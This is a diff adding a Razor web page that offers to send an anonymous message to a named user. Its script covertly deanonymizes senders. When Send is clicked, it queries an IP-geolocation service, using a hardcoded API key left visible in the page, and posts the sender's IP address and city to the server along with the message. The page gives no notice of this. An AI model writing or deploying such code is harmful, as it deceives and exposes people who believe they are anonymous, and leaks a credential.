@@ -1,0 +1,145 @@
+﻿@{
+    ViewData["Title"] = "Send Messege";
+
+
+    Layout = "~/Views/Shared/_MyLayout.cshtml";
+
+}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Latest compiled and minified CSS -->
+    <title>Ip</title>
+</head>
+<body>
+    <div class="container">
+        <div class="card card-warning">
+            <div class="card-header">
+                <h3 class="card-title">Send Anon Messege</h3>
+            </div>
+            <!-- /.card-header -->
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-sm-12">
+                        <div class="form-group">
+                            <label>Messeage</label>
+                            @if (ViewBag.user != null)
+                            {
+                                <textarea id="messege" rows="3" name="messege" class="form-control border-1" placeholder="Enter Your Anon Messege to @ViewBag.user"></textarea>
+                                <input type="text" name="username" id="username" readonly value="@ViewBag.user" hidden />
+                            }
+                            else
+                            {
+                                <textarea id="messege" rows="3" name="messege" class="form-control border-1" placeholder="Enter Your Anon Messege to snpsujon"></textarea>
+                                <input type="text" name="username" id="username" readonly value="snpsujon" hidden />
+                            }
+
+                        </div>
+                    </div>
+                </div>
+                @if (ViewBag.userlink != null)
+                {
+                <div class="row">
+
+                    <div class="col-md-12">
+                        <div class="form-group">
+                            <label>Your Anon Link</label>
+                            <input type="text" name="name" id="mylink" value="" class="form-control border-1" disabled/>
+                        </div>
+
+                    </div>
+
+                </div>
+                }
+                <div class="row">
+
+                    <div class="col-md-6">
+                        <div class="form-group">
+                            <button class="btn btn-info float-right" id="getValBtnID1">Send</button>
+                        </div>
+
+                    </div>
+
+                </div>
+            </div>
+            <!-- /.card-body -->
+        </div>
+
+
+
+
+    </div>
+
+    <p class="ac"></p>
+    <p class="ad"></p>
+    <div class="pic"></div>
+    <div id="log"></div>
+
+    <img src="" alt="">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+    <script>
+
+
+        var mylink = window.location.href;
+        $('#mylink').val(mylink);
+
+
+        $('#getValBtnID1').click(function () {
+            let apiKey = 'f8e0b361e8f4405c94613ab534959fdf';
+            $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=' + apiKey, function (data) {
+
+                var mydata = {};
+                mydata.city = data.city;
+                mydata.ip = data.ip;
+                mydata.msg = $('#messege').val();
+                mydata.username = $('#username').val();
+
+
+
+                console.log(mydata);
+
+                $.ajax({
+                    url: "/Home/Index",
+                    type: "POST",
+                    data: { data: mydata },
+                    success: function (mydata) {
+                        if (mydata == 1) {
+                            alert("Messege Has Been Send");
+                            window.location.reload();
+                        }
+                        else {
+                            alert("There has a Problem to send your Messege");
+                        }
+
+
+                    },
+
+                });
+                console.log(JSON.stringify(data, null, 2));
+
+
+
+
+            });
+
+
+
+        });
+
+
+
+
+
+
+
+
+
+
+
+    </script>
+</body>
+</html>
